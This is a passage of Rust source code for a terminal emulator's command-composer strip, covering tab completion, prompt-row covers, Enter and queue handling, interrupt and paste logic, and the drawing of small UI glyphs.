        let home = std::env::var("USERPROFILE").ok();
        match complete::start(
            &self.fam,
            cwd,
            home.as_deref(),
            &self.draft,
            caret_byte,
            complete::ENUM_CAP,
        ) {
            complete::Start::Cycle(mut cyc) => {
                let (draft, caret) = cyc.step(delta);
                self.draft = draft;
                self.tab = Some(cyc);
                self.recall = None;
                Some(caret)
            }
            complete::Start::Edit { draft, caret } => {
                // Single candidate / over-cap common prefix: applied without
                // a cycle — the next Tab re-plans (completed dirs descend).
                self.draft = draft;
                self.tab = None;
                self.recall = None;
                Some(caret)
            }
            complete::Start::None => None,
        }
    }

    /// Esc mid-cycle: restore the original token and end the cycle. The
    /// caller consumes that ONE Esc — the ordinary Esc chain (blur to grid)
    /// continues on the next press. Only called while `tab_active()`.
    pub fn tab_escape(&mut self) -> Option<usize> {
        let cyc = self.tab.take()?;
        if !cyc.matches(&self.draft) {
            return None;
        }
        let (draft, caret) = cyc.restore();
        self.draft = draft;
        Some(caret)
    }
}

/// The grid row the CURRENT-PROMPT cover should BLANK this frame, if any
/// (static-input architecture: the shell's latched prompt row renders as
/// whitespace — the composer's strip editor is the one prompt; the grid
/// cursor stays hidden under the blank). Single source of truth for the
/// paint gate. A live SubmitHold pins the blank to its recorded row through
/// the submit handoff REGARDLESS of mode and cursor — the hold exists
/// precisely while the grid underneath is behind the user's intent.
/// Otherwise the armed chain: Compose + live prompt latch + cursor exactly
/// at the captured prompt end — any certainty failure ⇒ no blank, raw
/// rendering (never blank on uncertainty). term_view adds visibility checks
/// only; the blank rides display_offset like every presentational cover.
pub fn cover_line_for(
    state: &ComposerState,
    backend: &TermBackend,
    comp_active: bool,
    now: Instant,
) -> Option<i32> {
    state
        .hold_line(backend, now)
        .or_else(|| {
            (comp_active && state.at_prompt_latched() && backend.cursor_at_prompt_end())
                .then(|| {
                    backend
                        .block_feed
                        .as_ref()
                        .and_then(|f| f.prompt_end)
                        .map(|(line, _)| line)
                })
                .flatten()
        })
        .or_else(|| {
            // Prompt-RENDER-window blank (Bug 2, the 1-frame `PS C:\>` flash
            // at submit): between the scanned `pre` and its 133;B the fresh
            // prompt text paints raw — at the bottom of the screen that reads
            // as flicker on every submit. We provably know a prompt is
            // rendering and on WHICH row (`incoming_prompt_row`: pre scanned,
            // no exec since, no prompt_end yet, live cursor still on the
            // captured row) — blank it; the armed cover takes over on the
            // same row the frame 133;B lands. Compose-scoped: a raw-mode
            // user's prompt must render normally. Freshness-capped so a lost
            // 133;B resurfaces the raw prompt fast. Any certainty failure ⇒
            // no blank (drop-don't-drift).
            (comp_active
                && state.mode == ComposerMode::Compose
                && state
                    .at_prompt_since
                    .is_some_and(|t| now.duration_since(t) < INCOMING_COVER_CAP))
            .then(|| backend.incoming_prompt_row())
            .flatten()
        })
}

/// The LEFT lane's content class this frame — the stable-chrome state table
/// (F3), pure so the strip-stability walk is pinned by test. The right
/// cluster never depends on this: it is pixel-static across every row of
/// the table. `open_rec` = an open record exists in the mirrored recs.
#[derive(PartialEq, Debug, Clone, Copy)]
pub(crate) enum LaneContent {
    /// Compose: `❯ cwd` + the editor with the one caret.
    Editor,
    SessionEnded,
    /// SSH auto-reconnect: spinner + "reconnecting…" left, accent `Cancel`
    /// in the Run slot. Wins over SessionEnded while the flag is set (the
    /// daemon is actively retrying — Dead is a transient here).
    Reconnecting,
    /// SLEEP §7.3: `☾ asleep` left, accent `Wake ▸` in the Run slot.
    Asleep,
    AltScreen,
    /// SubmitHold live: the submitted text, frozen (no caret) — at Enter the
    /// only pixel change is the caret disappearing.
    Frozen,
    /// A transient younger than REVEAL (post-submit window, pre→133;B render
    /// gap, hold release, un-revealed busy): render NOTHING new.
    Quiet,
    /// Open block ≥ REVEAL old: pulsing dot + cmd + elapsed.
    Busy,
    /// Steady raw: keyboard glyph + label (+ ❯ Compose when armable).
    Label,
}

pub(crate) fn lane_content(
    state: &ComposerState,
    running: bool,
    alt: bool,
    open_rec: bool,
    now: Instant,
) -> LaneContent {
    let reason = match state.mode {
        ComposerMode::Compose => return LaneContent::Editor,
        ComposerMode::Raw(r) => r,
    };
    // SLEEP: shelved wins over dead — the flag check covers the one-frame
    // window where the mode still says Dead but the Snapshot already
    // flagged the terminal (tick re-derives Raw(Asleep) next frame).
    if reason == RawReason::Asleep || (state.asleep && !running) {
        return LaneContent::Asleep;
    }
    // Reconnecting wins over SessionEnded: while the supervision flag is up
    // the Dead states between attempts are transients — the lane must not
    // flicker Dead/attempt/Dead across the backoff. (Never over Asleep:
    // sleep cancels supervision daemon-side.)
    if state.reconnecting {
        return LaneContent::Reconnecting;
    }
    if !running || reason == RawReason::Dead {
        return LaneContent::SessionEnded;
    }
    if alt {
        return LaneContent::AltScreen;
    }
    if state.submit_hold.is_some() {
        return LaneContent::Frozen;
    }
    // F7 companion: a scanned pre closes the block locally — the busy row
    // must not linger for the Blocks round-trip.
    if open_rec && !state.at_prompt_latched() {
        let revealed = state
            .busy_since
            .is_some_and(|t| now.duration_since(t) >= REVEAL);
        return if revealed {
            LaneContent::Busy
        } else {
            LaneContent::Quiet
        };
    }
    if state
        .last_activity
        .is_some_and(|t| now.duration_since(t) < REVEAL)
    {
        return LaneContent::Quiet;
    }
    LaneContent::Label
}

/// What `show` hands back to the app.
pub struct ComposerOutput {
    /// Bytes to ship to the daemon as terminal input (submission / refresh /
    /// clear chord) — the ONLY bytes composer code may emit (§14).
    pub write: Vec<u8>,
    /// The editor holds egui focus this frame (steers the grid's focus flag).
    pub has_focus: bool,
    /// This frame's submit was the empty-Enter spacing gesture: the app marks
    /// the current prompt row a blank spacer cover (§ "more lines").
    pub spacer_gesture: bool,
    /// The strip's History button was clicked (P4): the app toggles the
    /// cross-session history popup.
    pub toggle_history: bool,
    /// Screen rect of the History button this frame, when drawn — the
    /// popup's click-outside close must exempt it (blocks-panel pattern).
    pub history_btn: Option<Rect>,
    /// SLEEP §7.3: the lane's `Wake ▸` was clicked — the app sends
    /// RestartTerminal (launch() clears the asleep flag).
    pub wake: bool,
    /// The dead lane's `Restore ▸` was clicked — the app sends
    /// RestartTerminal (the unmissable dead-ssh affordance; the top bar shed
    /// its Restore in task #22, leaving only the row's hover ↻).
    pub restore: bool,
    /// The reconnecting lane's `Cancel` was clicked — the app sends
    /// C2D::CancelReconnect (supervision stops; Dead + Restore affordances
    /// take over).
    pub cancel_reconnect: bool,
}

/// What the manual-activation click will do to typed prompt text — computed
/// per frame ONLY in the ManualOnly-dirty strip state (one bounded grid read
/// of ≤ RECLAIM_ROW_CAP×cols cells; µs against the ~240µs p50 frame). No
/// caching: a cache keyed on cursor position would go stale on Delete-key
/// edits, and a wrong label is worse than microseconds.
#[derive(Clone, Copy, PartialEq, Debug)]
enum ActPreview {
    Keeps,
    Clears,
}

fn activation_preview(backend: &TermBackend) -> ActPreview {
    match backend.reclaim_text() {
        Reclaim::Text(t) if !t.is_empty() => ActPreview::Keeps,
        _ => ActPreview::Clears,
    }
}

fn now_ms() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::SystemTime::UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0)
}

/// TC_TRACE_COMPOSER=1 → per-episode gate-verdict lines in gui.log (cached
/// once; costs nothing otherwise).
fn trace_enabled() -> bool {
    static ON: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
    *ON.get_or_init(|| std::env::var("TC_TRACE_COMPOSER").as_deref() == Ok("1"))
}

/// Caret line of the composer TextEdit: (line index, total lines). Defaults
/// to the first line when the edit state doesn't exist yet.
fn caret_line(ctx: &egui::Context, id: Id, text: &str) -> (usize, usize) {
    let total = text.split('\n').count().max(1);
    let idx = egui::text_edit::TextEditState::load(ctx, id)
        .and_then(|s| s.cursor.char_range())
        .map(|r| r.primary.index.0)
        .unwrap_or(0);
    let line = text
        .chars()
        .take(idx)
        .filter(|&c| c == '\n')
        .count()
        .min(total - 1);
    (line, total)
}

/// The editor caret as a BYTE offset into the draft (the tokenizer's
/// coordinate space). No edit state yet ⇒ the draft's end.
fn caret_byte_of(ctx: &egui::Context, id: Id, text: &str) -> usize {
    let chars = egui::text_edit::TextEditState::load(ctx, id)
        .and_then(|s| s.cursor.char_range())
        .map(|r| r.primary.index.0)
        .unwrap_or_else(|| text.chars().count());
    text.char_indices()
        .nth(chars)
        .map(|(b, _)| b)
        .unwrap_or(text.len())
}

/// Place the editor caret at a char index BEFORE the TextEdit shows (the
/// caret_to_end pattern, arbitrary position) — after a Tab replaces the
/// token, typing continues at the completed token's end.
fn set_caret_chars(ctx: &egui::Context, id: Id, chars: usize) {
    let mut st = egui::text_edit::TextEditState::load(ctx, id).unwrap_or_default();
    st.cursor
        .set_char_range(Some(egui::text::CCursorRange::one(egui::text::CCursor::new(
            chars,
        ))));
    st.store(ctx, id);
}

/// Tiny painter keyboard glyph (mouse-first: labels get icons, not hotkeys).
fn draw_keyboard(painter: &egui::Painter, c: Pos2, color: Color32) {
    let body = Rect::from_center_size(c, Vec2::new(16.0, 11.0));
    painter.rect_stroke(
        body,
        CornerRadius::same(2),
        Stroke::new(1.2, color),
        StrokeKind::Inside,
    );
    for (x, y) in [(-4.0, -2.0), (0.0, -2.0), (4.0, -2.0)] {
        painter.circle_filled(c + Vec2::new(x, y), 0.7, color);
    }
    painter.line_segment(
        [c + Vec2::new(-4.0, 2.5), c + Vec2::new(4.0, 2.5)],
        Stroke::new(1.0, color),
    );
}

/// Tiny painter padlock (v0.1.1 pre-shell password label; S14: painter
/// shapes, never a font glyph): filled body + stroked shackle arc.
fn draw_lock(painter: &egui::Painter, c: Pos2, color: Color32) {
    let body = Rect::from_center_size(c + Vec2::new(0.0, 2.5), Vec2::new(10.0, 8.0));
    painter.rect_filled(body, CornerRadius::same(2), color);
    let r = 3.2;
    let cy = body.min.y;
    let n = 10;
    let mut prev: Option<Pos2> = None;
    for k in 0..=n {
        let a = std::f32::consts::PI * (k as f32 / n as f32);
        let p = Pos2::new(c.x - r * a.cos(), cy - r * a.sin());
        if let Some(q) = prev {
            painter.line_segment([q, p], Stroke::new(1.4, color));
        }
        prev = Some(p);
    }
}

/// Paint the composer's prompt prefix — accent `❯` + dimmed live cwd — on a
/// covered grid row, returning the x where the command text begins. Shared
/// by the live editor and the SubmitHold ghost so the two are pixel-identical
/// (Bug 3: the swap at release must move zero pixels). Also reused by
/// term_view for permanent history covers so a submitted row's `❯ cmd`
/// styling matches the armed/hold look exactly (no swap on hold→history).
pub(crate) fn paint_prompt_prefix(
    painter: &egui::Painter,
    row: Rect,
    cwd: Option<&str>,
    font: &FontId,
) -> f32 {
    let mut x = row.min.x;
    let glyph = painter.layout_no_wrap("\u{276f}".into(), font.clone(), super::ACCENT);
    let gy = row.center().y - glyph.size().y / 2.0;
    let gw = glyph.size().x;
    painter.galley(Pos2::new(x, gy), glyph, super::ACCENT);
    x += gw + 8.0;
    if let Some(cwd) = cwd {
        let g = painter.layout_no_wrap(
            super::middle_ellipsize(cwd, 32),
            font.clone(),
            super::TEXT_SECONDARY,
        );
        let w = g.size().x;
        painter.galley(
            Pos2::new(x, row.center().y - g.size().y / 2.0),
            g,
            super::TEXT_SECONDARY,
        );
        x += w + 12.0;
    }
    x
}

/// Draw the composer and route its input. Returns bytes to ship and whether
/// the composer holds egui focus this frame.
///
/// STATIC-INPUT ARCHITECTURE (user decision, supersedes the in-grid armed
/// cover): the editor is stationary furniture — it ALWAYS renders here in
/// the strip lane as `❯ {cwd} {draft}` with the one caret. The grid above
/// is content-only: its latched prompt row is BLANKED by the current-prompt
/// cover (`cover_line`, painted by term_view exactly like spacer rows) and
/// submitted commands become `❯ cwd cmd` history covers where their PS rows
/// were. Responses stack above; the input never moves.
///
/// Seamless doctrine: NO fills, NO hairlines, NO bordered boxes. Structure
/// is spacing and subtle background shifts, never lines. The screenshot
/// test: a terminal with magic, not an app wrapping a terminal.
#[allow(clippy::too_many_arguments)]
pub fn show(
    ui: &mut Ui,
    strip_rect: Rect,
    grid_rect: Rect,
    terminal_id: Uuid,
    state: &mut ComposerState,
    backend: &TermBackend,
    recs: &[BlockRec],
    epoch: u32,
    running: bool,
    overlay_open: bool,
    font: FontId,
    cover_line: Option<i32>,
    prompt_cwd: Option<&str>,
) -> ComposerOutput {
    let mut out = ComposerOutput {
        write: Vec::new(),
        has_focus: false,
        spacer_gesture: false,
        toggle_history: false,
        history_btn: None,
        wake: false,
        restore: false,
        cancel_reconnect: false,
    };
    let now = Instant::now();
    let inputs = state.gate_inputs(backend, recs, running, now);
    // SLEEP §7.3: the lane presents asleep this frame — swaps the Run slot
    // to the accent `Wake ▸` (same fixed slot, stable chrome F3). The flag
    // check covers the one-frame Snapshot-before-tick window.
    let asleep_lane = matches!(state.mode, ComposerMode::Raw(RawReason::Asleep))
        || (state.asleep && !running);
    // SSH auto-reconnect: `reconnecting…` lane + Cancel in the Run slot
    // (never over asleep — sleep cancels supervision daemon-side).
    let recon_lane =
        state.reconnecting && !asleep_lane && matches!(state.mode, ComposerMode::Raw(_));
    // Dead lane: the unmissable Restore ▸ in the Run slot (Bug 4 — the top
    // bar shed lifecycle icons in task #22 and "Session ended" alone was
    // nearly invisible on a dead ssh tab).
    let dead_lane = !running
        && !asleep_lane
        && !recon_lane
        && matches!(state.mode, ComposerMode::Raw(_));
    let painter = ui.painter().clone();

    // ── Static-input architecture: the editor ALWAYS lives here in the
    // strip lane, rendered `❯ {cwd} {draft}` with the one caret; the grid
    // above is content-only (its latched prompt row is blanked by the
    // current-prompt cover — see cover_line_for). Fixed right-cluster slot
    // geometry, IDENTICAL in every mode (stable chrome, F3): elements may
    // dim, never move or unmount — submitting `ls` changes zero strip pixels
    // except the caret/text.
    let kbd_rect = Rect::from_center_size(
        Pos2::new(strip_rect.max.x - 22.0, strip_rect.center().y),
        Vec2::splat(22.0),
    );
    let run_w = 58.0;
    let run_rect = Rect::from_center_size(
        Pos2::new(strip_rect.max.x - 44.0 - run_w / 2.0, strip_rect.center().y),
        Vec2::new(run_w, 24.0),
    );
    let hist_rect = Rect::from_center_size(
        Pos2::new(run_rect.min.x - 16.0, strip_rect.center().y),
        Vec2::splat(22.0),
    );
    out.history_btn = Some(hist_rect);
    // The right-aligned text slot left of History: the Compose hints and the
    // Raw ❯ Compose affordance share it (one slot, never two occupants).
    let slot_right = hist_rect.min.x - 8.0;
    let lane_x = strip_rect.min.x + 14.0;
    let lane_rect = Rect::from_min_max(
        Pos2::new(lane_x, strip_rect.min.y),
        Pos2::new(slot_right, strip_rect.max.y),
    );

    let has_draft = !state.draft.trim().is_empty();
    // The post-submit typeahead buffer is engaged: keys keep landing in the
    // editor; Enter QUEUES (one command per prompt cycle) instead of
    // submitting into an unresolved prompt.
    let buffering = state.buffering();
    // P6b §6: cmd executes one line per prompt — a multi-line draft can
    // neither submit nor queue on a Cmd terminal (the strip hint says why);
    // Enter keeps buffering it visibly in the TextEdit (the fusion guard's
    // InsertNewline path). The user splits or edits it back to one line.
    let cmd_multiline = state.is_cmd && state.draft.contains('\n');
    // Submission gating: an external submit / spoofed exec disables Enter
    // until the next prompt (inv. 4 — the editor never loses focus over it),
    // and the typeahead window holds Enter until its resolution.
    let can_submit = inputs.running
        && !inputs.alt
        && !inputs.open_block
        && inputs.at_prompt
        && !buffering
        && !cmd_multiline;

    // PRE-SHELL veto (v0.1.1): no hook event has been seen in the CURRENT
    // lifetime and no prompt latch is live — whatever is talking (ssh auth,
    // a login chain) is not the shell. `arm_available` MUST be false here:
    // never offer `❯ Compose` over a password prompt, and the cold-attach
    // heuristic must not apply either (its current-epoch check already fails
    // after the epoch bump; the veto makes it explicit).
    let pre_shell_now = pre_shell(
        inputs.running,
        inputs.alt,
        backend.block_feed.as_ref().map(|f| f.pre_seen).unwrap_or(0),
        backend.block_feed.as_ref().map(|f| f.exec_seen).unwrap_or(0),
        state.at_prompt_latched(),
    );

    // Manual-activation availability: the gate core passes AND either a live
    // prompt latch or the cold-attach heuristic (§2.2 — a closed record from
    // the CURRENT epoch proves this spawn reached an interactive prompt; the
    // restored-claude wrapper only has old-epoch records and stays raw).
    let core_passes = inputs.running && !inputs.alt && !inputs.mouse && !inputs.open_block;
    let cold_ok = !recs.is_empty()
        && recs.iter().all(|r| r.end_off.is_some())
        && recs.last().is_some_and(|r| r.epoch == epoch);
    let arm_available = core_passes && !pre_shell_now && (inputs.at_prompt || cold_ok);

    let strip_resp = ui.interact(
        strip_rect,
        Id::new(("composer_strip", terminal_id)),
        Sense::click(),
    );
    let hover_pos = ui.ctx().pointer_latest_pos();
    let over_kbd = hover_pos.is_some_and(|p| kbd_rect.contains(p));
    let over_run = hover_pos.is_some_and(|p| run_rect.contains(p));
    let over_hist = hover_pos.is_some_and(|p| hist_rect.contains(p));
    let row_h = ui.fonts_mut(|f| f.row_height(&font)).max(8.0);

    match state.mode {
        ComposerMode::Compose => {
            let ed_id = Id::new(("composer", terminal_id));

            // One-frame caret placement (P4): a reclaim/insert just replaced
            // the draft — put the caret at its end BEFORE the TextEdit shows
            // (the standard egui TextEditState pattern) so typing continues
            // where the landed text stopped.
            if state.caret_to_end {
                state.caret_to_end = false;
                let end = egui::text::CCursor::new(state.draft.chars().count());
                let mut st = egui::text_edit::TextEditState::load(ui.ctx(), ed_id)
                    .unwrap_or_default();
                st.cursor
                    .set_char_range(Some(egui::text::CCursorRange::one(end)));
                st.store(ui.ctx(), ed_id);
            }

            // Ctrl+C precedence while armed (Bug 4): a non-empty GRID
            // selection wins — copy it and consume the Copy event so the
            // TextEdit doesn't clobber the clipboard with its own (usually
            // empty) selection; the draft is untouched. With no grid
            // selection the event flows to the editor's native copy — UNLESS
            // nothing is copyable and the shell is NOT at a prompt: then the
            // user means INTERRUPT the running command (submit → hang →
            // Ctrl+C is the universal cancel; with the composer holding focus
            // through the post-submit window, the grid's interrupt path can
            // no longer see the chord). The win32 ^C ships, queued blind
            // submissions abort (nothing may fire after a cancel), the
            // visible draft is kept. Must run BEFORE the TextEdit is shown.
            if ui.input(|i| i.events.iter().any(|e| matches!(e, egui::Event::Copy))) {
                if let Some(text) = backend.selection_text().filter(|t| !t.is_empty()) {
                    ui.ctx().copy_text(text);
                    ui.input_mut(|i| i.events.retain(|e| !matches!(e, egui::Event::Copy)));
                } else {
                    let editor_sel = egui::text_edit::TextEditState::load(ui.ctx(), ed_id)
                        .and_then(|s| s.cursor.char_range())
                        .is_some_and(|r| r.primary != r.secondary);
                    if !editor_sel && state.at_prompt_since.is_none() && inputs.running {
                        ui.input_mut(|i| {
                            i.events.retain(|e| !matches!(e, egui::Event::Copy))
                        });
                        state.pending.clear();
                        state.post_submit = None;
                        state.last_activity = Some(now);
                        out.write = clear_chord(backend);
                        if trace_enabled() {
                            log::info!(
                                "[composer] Ctrl+C while busy → interrupt (buffer aborted)"
                            );
                        }
                    }
                }
            }

            // Normalize pasted text BEFORE the TextEdit sees it (Bug E):
            // Windows clipboard text arrives verbatim (CRLF + trailing
            // newline survive the arboard→winit→egui chain, and multiline
            // TextEdit inserts pastes unmodified), so a copied line's
            // trailing \r\n used to flip the lane editor into the upward
            // multi-line popup — the "floating band above the strip"
            // artifact. Rewrite the Paste event in place: same
            // consume-before-show pattern as Copy above, gated like Tab on
            // !overlay_open (an overlay's own text field keeps native
            // paste). Genuinely multi-line pastes keep their interior
            // newlines and still open the popup.
            if !overlay_open {
                ui.input_mut(|i| {
                    for e in &mut i.events {
                        if let egui::Event::Paste(t) = e {
                            *t = normalize_paste_text(t);
                        }
                    }
                });
            }

            // Consume keys BEFORE showing the TextEdit (standard egui
            // pattern): plain Enter submits (Shift+Enter passes through as a
            // newline); Arrow Up/Down recall history only at the draft's
            // vertical edges.
            // Enter at a live prompt — a NON-empty draft runs the command;
            // an EMPTY draft sends a bare `\r`, the user's "more lines"
            // spacing gesture (submit() marks the row a blank spacer so it
            // renders as whitespace, not a stacked raw prompt). The Run ▸
            // button, by contrast, stays gated on a non-empty draft (the
            // gesture is Enter, not a visible button press).
            //
            // FUSION GUARD (repro bonus defect): Enter while `can_submit` is
            // false used to be consumed and silently DROPPED while typing
            // kept extending the draft — the next successful Enter submitted
            // the fused backlog as one command (staging executed `lsechols`).
            // Now the un-armable Enter is NOT consumed: the TextEdit inserts
            // a line break at the caret, the draft visibly holds both
            // commands as separate lines, and submission encodes each line
            // as its own `\r` — two commands can never fuse. An EMPTY draft's
            // un-armable Enter is still swallowed (nothing to separate; a
            // newline would just grow the editor).
            let mut submit_now = false;
            // While an overlay (history popup / search / panel) is open, the
            // popup owns Enter/arrows — consuming them here on the stale
            // has_focus of the open frame would race the popup's own
            // consume-before-show (P4 §3.6 focus chain).
            if state.has_focus && !overlay_open {
                // Consume EVERY pending Enter press, not just one: a held
                // key delivers several repeats per frame, and any press left
                // unconsumed falls into the TextEdit as a stray newline
                // (scope #3 — the held-Enter flood).
                let consume_all_enters = |ui: &mut Ui| {
                    let mut n = 0u32;
                    while ui.input_mut(|i| i.consume_key(Modifiers::NONE, Key::Enter)) {
                        n += 1;
                    }
                    n
                };
                match enter_action(can_submit, has_draft, buffering && !cmd_multiline) {
                    EnterAction::Submit => {
                        let n = consume_all_enters(ui);
                        if n > 0 {
                            if has_draft {
                                // Repeats beyond the first collapse into ONE
                                // submission — the draft empties on submit,
                                // there is nothing further to run.
                                submit_now = true;
                            } else {
                                // Empty-Enter spacing gesture (scope #3):
                                // QUEUE, never yield. Compose keeps focus for
                                // the whole run — the first spacer used to
                                // yield raw, and every remaining key-repeat
                                // then fell through to the grid as raw Enter
                                // spam (prompt flood + lost arm + the
                                // blank-void screen).
                                for _ in 0..n {
                                    state.push_spacer();
                                }
                            }
                        }
                    }
                    // Post-submit typeahead: Enter queues the draft as a
                    // blind submission on its own prompt cycle (rapid
                    // `cmd1⏎cmd2⏎cmd3⏎` = three clean sequential blocks).
                    // A full queue falls back to the visible-buffering
                    // newline (leave Enter unconsumed for the TextEdit).
                    EnterAction::Queue => {
                        if state.pending_has_room() {
                            let n = consume_all_enters(ui);
                            if n > 0 {
                                if has_draft {
                                    state.queue_draft();
                                    for _ in 1..n {
                                        state.push_spacer();
                                    }
                                } else {
                                    for _ in 0..n {
                                        state.push_spacer();
                                    }
                                }
                            }
                        } else if !has_draft {
                            let _ = consume_all_enters(ui);
                        }
                    }
                    EnterAction::Swallow => {
                        let _ = consume_all_enters(ui);
                    }
                    // NOT consumed: the TextEdit inserts the line break at
                    // the caret (the fusion guard's visible buffering).
                    EnterAction::InsertNewline => {}
                }
                let (line, total) = caret_line(ui.ctx(), ed_id, &state.draft);
                if line == 0 && ui.input_mut(|i| i.consume_key(Modifiers::NONE, Key::ArrowUp)) {
                    state.recall_prev(recs);
                }
                if line + 1 == total
                    && ui.input_mut(|i| i.consume_key(Modifiers::NONE, Key::ArrowDown))
                {
                    state.recall_next(recs);
                }
            }

            // ── Tab completion (task #24): consumed BEFORE the TextEdit
            // shows (the standard consume-before-show pattern) — the editor
            // runs lock_focus(true), which sets egui's event-filter tab bit,
            // and the multiline TextEdit then inserts a literal `\t` on any
            // Tab press it sees (the user-reported "3 spacing" bug). Tab
            // must NEVER put spaces/tabs in the draft in ANY state, so this
            // runs regardless of has_focus (in Compose mode the grid never
            // reads keys — mode-based exclusion — so nothing else wants
            // them). Shift+Tab is consumed FIRST: consume_key matches
            // modifiers LOGICALLY, so the NONE pattern would swallow the
            // shifted presses too. Esc mid-cycle restores the original
            // token and eats that one Esc — the ordinary Esc chain (blur
            // to grid) continues on the next press.
            if !overlay_open {
                let back =
                    ui.input_mut(|i| i.count_and_consume_key(Modifiers::SHIFT, Key::Tab)) as i64;
                let fwd =
                    ui.input_mut(|i| i.count_and_consume_key(Modifiers::NONE, Key::Tab)) as i64;
                if state.tab_active() && ui.input(|i| i.key_pressed(Key::Escape)) {
                    ui.input_mut(|i| i.consume_key(Modifiers::NONE, Key::Escape));
                    if let Some(caret) = state.tab_escape() {
                        set_caret_chars(ui.ctx(), ed_id, caret);
                    }
                } else if fwd != back {
                    let caret_byte = caret_byte_of(ui.ctx(), ed_id, &state.draft);
                    if let Some(caret) = state.tab_press(prompt_cwd, caret_byte, fwd - back) {
                        set_caret_chars(ui.ctx(), ed_id, caret);
                    }
                }
                // Belt: strip any Tab press that slipped the exact-modifier
                // counts (Ctrl+Tab and friends) — egui's multiline arm would
                // still insert `\t` for them.
                ui.input_mut(|i| {
                    i.events.retain(|e| {
                        !matches!(
                            e,
                            egui::Event::Key {
                                key: Key::Tab,
                                pressed: true,
                                ..
                            }
                        )
                    })
                });
            }

            // ── The static editor: `❯ {cwd} {draft}` in the lane, ALWAYS —
            // stationary furniture (the user's architecture call). The grid
            // above is content-only; its latched prompt row is blanked by
            // the current-prompt cover. Multi-line drafts grow UPWARD from
            // the strip as a Foreground overlay so the grid keeps its
            // geometry (D1); the lane prefix stays painted (F8: ❯ + cwd
            // never vanish when the draft grows a second line).
            let x = paint_prompt_prefix(&painter, lane_rect, prompt_cwd, &font);
            // Frozen ghost through the submit handoff (Bug 3, static-input):
            // while the SubmitHold lives and the next command hasn't been
            // typed yet, the lane keeps showing the just-submitted text — at
            // Enter effectively only the caret changes, and the text
            // "commits upward" into the grid's history cover on release.
            // The first keystroke of the NEXT command replaces it (the
            // typeahead buffer means typing continues here, not raw).
            let lane_ghost = state
                .submit_hold
                .as_ref()
                .filter(|_| state.draft.is_empty())
                .map(|h| h.ghost.lines().next().unwrap_or("").to_string());
            let n_lines = editor_rows(&state.draft);
            let resp = if n_lines > 1 {
                let h = (n_lines.min(EDITOR_MAX_ROWS) as f32) * row_h + 12.0;
                let h = h.min(grid_rect.height().max(row_h + 12.0));
                let pop = Rect::from_min_max(
                    Pos2::new(strip_rect.min.x + 8.0, strip_rect.min.y - h),
                    Pos2::new(strip_rect.max.x - 8.0, strip_rect.min.y),
                );
                egui::Area::new(Id::new(("composer_pop", terminal_id)))
                    .order(egui::Order::Foreground)
                    .fixed_pos(pop.min)
                    .show(ui.ctx(), |aui| {
                        // Depth by shadow + background, never by strokes.
                        egui::Frame::new()
                            .fill(super::TERM_BG)
                            .corner_radius(CornerRadius::same(8))
                            .shadow(egui::epaint::Shadow {
                                offset: [0, 6],
                                blur: 28,
                                spread: 0,
                                color: Color32::from_black_alpha(150),
                            })
                            .inner_margin(egui::Margin::symmetric(10, 6))
                            .show(aui, |aui| {
                                aui.set_width(pop.width() - 20.0);
                                egui::ScrollArea::vertical()
                                    .max_height(h - 12.0)
                                    .show(aui, |aui| {
                                        aui.add(
                                            egui::TextEdit::multiline(&mut state.draft)
                                                .id(ed_id)
                                                .font(font.clone())
                                                .desired_rows(2)
                                                .desired_width(f32::INFINITY)
                                                .lock_focus(true)
                                                .frame(egui::Frame::NONE),
                                        )
                                    })
                                    .inner
                            })
                            .inner
                    })
                    .inner
            } else {
                let ed_rect = Rect::from_min_max(
                    Pos2::new(x, strip_rect.min.y + (STRIP_H - row_h) / 2.0 - 1.0),
                    Pos2::new(slot_right, strip_rect.max.y - 4.0),
                );
                let mut ed_ui = ui.new_child(
                    egui::UiBuilder::new()
                        .max_rect(ed_rect)
                        .layout(egui::Layout::top_down(egui::Align::Min)),
                );
                let resp = ed_ui.add(
                    egui::TextEdit::multiline(&mut state.draft)
                        .id(ed_id)
                        .font(font.clone())
                        .hint_text(if lane_ghost.is_some() {
                            ""
                        } else {
                            "Type a command\u{2026}"
                        })
                        .desired_rows(1)
                        .desired_width(ed_rect.width())
                        .lock_focus(true)
                        .frame(egui::Frame::NONE),
                );
                if let Some(g) = &lane_ghost {
                    if !g.is_empty() {
                        let galley =
                            painter.layout_no_wrap(g.clone(), font.clone(), super::TEXT);
                        painter.galley(
                            Pos2::new(x, strip_rect.center().y - galley.size().y / 2.0),
                            galley,
                            super::TEXT,
                        );
                    }
                }
                resp
            };

            // A user edit forks off any active recall (§6.2).
            if resp.changed() {
                state.recall = None;
            }

            // Escape: the TextEdit surrenders focus natively; yield the
            // episode to the grid. Otherwise keep/regain focus while no
            // overlay (search/modal/panel) owns typing — this is what makes
            // "close search → typing returns to the composer" work (§12.11).
            // (The primary focus grab is the pre-term_view request in
            // terminal_card, which stops keys falling to the grid in the arm
            // frame; this is the belt.)
            let esc = ui.input(|i| i.key_pressed(Key::Escape));
            if resp.lost_focus() && esc {
                state.blur_to_grid();
            } else if !overlay_open && (state.want_focus || !resp.has_focus()) {
                // Held through submits too (typeahead buffering): the editor
                // keeps focus across the submit→re-arm window so the next
                // command's keys land here, never raw.
                resp.request_focus();
            }
            // Clear want_focus only once egui has CONFIRMED focus on the
            // editor — otherwise a frame where the grab didn't land (overlay,
            // repaint timing) would drop the intent and a key could fall to
            // the grid, killing the arm (Bug 1).
            if resp.has_focus() {
                state.want_focus = false;
            }

            if submit_now {
                // Focus is NOT surrendered: the post-submit typeahead
                // window keeps the editor live for the next command.
                let (bytes, spacer) = state.submit(backend, cover_line, prompt_cwd);
                out.write = bytes;
                out.spacer_gesture = spacer;
            } else if out.write.is_empty() {
                // Paced blind-queue dispatch (typeahead + scope #3): one
                // queued submission (or bare-`\r` spacer) per completed
                // prompt round-trip, mode stays Compose, focus stays here —
                // the caller marks the spacer cover exactly like a
                // submit-time gesture.
                if let Some((bytes, spacer)) =
                    state.pump_pending(backend, cover_line, prompt_cwd, now)
                {
                    out.write = bytes;
                    out.spacer_gesture = spacer;
                }
            }

            // Hint slot (right-aligned left of History) — painted only when
            // it cannot collide with the editor's text (the lane owns the
            // full width; the hint floats over its empty tail).
            // Stable chrome: transients younger than REVEAL show nothing —
            // an instant command's submit window must not flash "waiting
            // for prompt…" through the slot (F3); a genuinely busy shell
            // reveals it once the edge is stale.
            let quiet = state
                .last_activity
                .is_some_and(|t| now.duration_since(t) < REVEAL);
            let hint = if lane_ghost.is_some() {
                None
